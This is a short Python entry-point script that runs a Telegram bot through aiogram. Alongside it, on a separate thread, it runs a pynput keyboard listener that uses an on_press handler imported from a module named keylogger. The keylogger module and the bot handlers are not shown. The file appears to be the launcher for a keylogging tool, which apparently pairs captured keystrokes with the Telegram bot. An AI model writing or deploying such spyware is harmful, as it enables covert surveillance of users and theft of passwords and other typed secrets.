from handlers import router
from aiogram import Bot, Dispatcher
from dotenv import load_dotenv
import os
from pynput import keyboard
from keylogger import on_press

import threading
import asyncio

load_dotenv()
async def main():
    bot = Bot(token=os.getenv('TOKEN'))
    dp = Dispatcher()

    dp.include_router(router)
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

def start_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.start()

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass